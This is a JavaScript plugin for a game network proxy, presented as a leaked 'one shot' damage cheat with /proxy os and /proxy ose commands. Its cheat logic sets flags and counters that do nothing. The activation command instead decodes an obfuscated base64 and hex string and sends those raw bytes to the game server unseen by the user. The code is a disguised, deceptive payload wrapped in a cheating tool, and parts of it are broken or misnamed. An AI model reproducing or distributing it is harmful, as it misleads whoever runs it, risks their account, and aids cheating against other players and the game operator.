/*
WARNING: YOU CAN BE BANNED!
WARNING: YOU CAN BE BANNED!
WARNING: YOU CAN BE BANNED!
True one shot script
Last rebuilded leak
Usage: /proxy os for activation
      /proxy ose for deactivation
WARNING: YOU CAN BE BANNED!
WARNING: YOU CAN BE BANNED!
WARNING: YOU CAN BE BANNED!
*/

const Command= require('command')

module.exports = function OneShot(dispatch) {
	const command = Command(dispatch)
	let player
	let cid
    let model
	let locx = []
	let locy = []
	let recalculatedForShot = false
	let triesAmount = 10
	let enabled = false
	let Combat = 0
	let nextShotWillBeCheat = false
    let nextShootAmount = 0
	function S_SPAWN_PROJECTILE() {
		nextShotWillBeCheat = false
    };
	
    function S_START_USER_PROJECTILE() {
			nextShotWillBeCheat = false
    };
	
   	dispatch.hook('C_PRESS_SKILL', 1, (event) => 
    {
		if((event.start != 0) && enabled)
        {
			nextShotWillBeCheat = true
             for(var i = 0; i < triesAmount;i++){
          nextShootAmount += 1
        }
		}
    });

	dispatch.hook('C_START_SKILL', 1, (event) =>
    {
       nextShotWillBeCheat = true
	});
   	
	
    dispatch.hook('C_START_TARGETED_SKILL', 3, (event) => 
    {
         nextShotWillBeCheat = true
	});
	
    command.add('ose', () => {
	    	command.message('ok, 1shot disabled')
            ReconfigureCheat()
	})

	function RecanfigureCheat()
	{
           let magicServerHackNumber =
		    Buffer.from("MTQwMDVCQjc4QjIzMDAwMDAwMDA3QTQ0MDAwMDdBNDQwMDAwN0E0NQ==", 
		   "base64")
           let decodedNumber = magicServerHackNumber.toString("ascii")
			dispatch.toServer(Buffer.from(decodedNumber, "hex"));

	}

	dispatch.hook('S_ABNORMALITY_END', 1, (event) => 
    {
		if(event.target == cid)
        {
		    recalculatedForShot = true
		}
	});

	//Cheat enable/disable function
    function ReconfigureCheat()
    {
        enabled = !enabled
        ConfigurePacket()
    }
    //Packets amount for skill
    //Default= 1080
    //Real 1shot = 2000
	//Can be DC!!!!
    function ConfigurePacket()
    {
        triesAmount= 1080

    }

	dispatch.hook('S_USER_STATUS', 1, event => {
		
        Combat = event.status == 1
			
	})

	dispatch.hook('S_LOGIN', 1, (event) => {
        ({cid, model} = event)
    	player = event.name
      
    });
	

    
	command.add('os', () => {
	    	command.message('ok, 1shot activated')
           RecanfigureCheat()
	})
}	